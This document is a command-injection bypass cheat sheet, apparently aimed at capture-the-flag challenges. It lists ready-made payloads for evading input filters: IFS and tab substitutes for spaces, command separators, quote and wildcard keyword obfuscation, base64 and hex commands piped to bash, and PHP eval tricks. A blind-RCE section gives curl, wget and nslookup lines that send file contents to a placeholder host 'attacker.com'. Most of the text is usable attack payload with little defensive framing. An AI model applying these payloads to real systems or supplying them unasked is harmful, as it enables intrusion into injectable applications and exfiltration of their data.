# Command-Injection Bypass Techniques Compendium

## Space Bypass

| Method | Example | Notes |
|------|------|------|
| `${IFS}` | `cat${IFS}flag.php` | internal field separator (default space/Tab/newline) |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` is the shell's 9th positional parameter (empty), preventing variable-name ambiguity |
| `${IFS}` + variable | `a=$IFS;cat${a}flag` | reference after assignment |
| `<` | `cat<flag.php` | redirection instead of a space |
| `%09` | `cat%09flag.php` | URL encoding of Tab |
| `%0a` | `cat%0aflag.php` | newline |
| `{cat,flag.php}` | `{cat,flag.php}` | Bash brace expansion (Bash only) |
| `%0d` | `cat%0dflag.php` | carriage return |

### Space-Bypass Selection Strategy
1. **Preferred** `$IFS$9` — best compatibility
2. **Alternative** `<` — concise, but `<` may be filtered in some contexts
3. **In URL scenarios** use `%09` or `%0a`

## Command Separators

| Separator | Example | Notes |
|--------|------|------|
| `;` | `id;cat flag` | sequential execution |
| `&&` | `id && cat flag` | run the second only if the first succeeds |
| `\|\|` | `id \|\| cat flag` | run the second only if the first fails |
| `\|` | `id \| cat flag` | pipe |
| `%0a` | `id%0acat flag` | newline execution |
| `%0d%0a` | `id%0d%0acat flag` | CRLF |

## Command/Keyword Bypass

### String Concatenation
```bash
c'a't flag.php       # single-quote concatenation
c"a"t flag.php       # double-quote concatenation
c\at flag.php        # backslash escape
```

### Variable Concatenation
```bash
a=c;b=at;$a$b flag.php
a=fl;b=ag;cat /$a$b
```

### Wildcards
```bash
cat /f???.php        # ? matches a single char
cat /f*              # * matches any characters
/bin/ca? /etc/pas?d  # also usable in paths
cat /f[a-z]ag.php    # character class
```

### base64 Encoding
```bash
echo Y2F0IGZsYWcucGhw | base64 -d | bash
# Y2F0IGZsYWcucGhw = "cat flag.php"
```

### hex Encoding
```bash
echo 63617420666c61672e706870 | xxd -r -p | bash
# 63617420666c61672e706870 = "cat flag.php"
```

### Use Non-Blocked Alternative Commands

| Goal | Original command | Alternative command |
|------|--------|---------|
| Read a file | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
| Read a file | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
| Find files | find | ls -la / dir / echo / locate |
| Download | wget | curl / nc / python -c 'import urllib...' |
| Write a file | echo > | tee / printf / python -c |

## No-Echo Exploitation (Blind RCE)

When the command-execution result is not visible:

### 1. DNS Exfiltration
```bash
curl http://attacker.com/$(cat flag.php | base64)
nslookup $(cat flag.php).attacker.com
```

### 2. HTTP Exfiltration
```bash
curl http://attacker.com/?data=$(cat flag.php | base64)
wget http://attacker.com/?data=$(cat flag.php | base64)
```

### 3. Write a File to an Accessible Path
```bash
cat flag.php > /var/www/html/flag.txt
# Then browse to http://target/flag.txt
```

### 4. Write to an Environment Variable / Temp File
```bash
cp flag.php /tmp/flag
# Then read /tmp/flag via another vulnerability
```

### 5. Time-Based Blind
```bash
if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
# Brute-force character by character
```

## Special PHP eval Bypasses

### Space Filtering in eval Scenarios

```php
// when eval($cmd) and spaces in $cmd are filtered
system("cat<flag.php");      // redirection
system("cat${IFS}flag.php"); // IFS
system("cat$IFS$9flag.php"); // IFS + positional parameter
```

### Length-Limit Bypass

```php
// when the parameter length is limited (e.g. strlen > 18)
// abuse PHP variable expansion
?a=system&b=cat flag.php
// eval($_GET[a]($_GET[b]));
```

### The flag Keyword Is Replaced

```php
// when "flag" is replaced with a space
// use wildcards
cat /f*          # * matches flag
cat /fl?g.php    # ? matches a single char
cat /fla?.php
// use path concatenation
cat /fl''ag.php  # empty-string concatenation
cat /fl\ag.php   # backslash (may be interpreted as an escape)
```
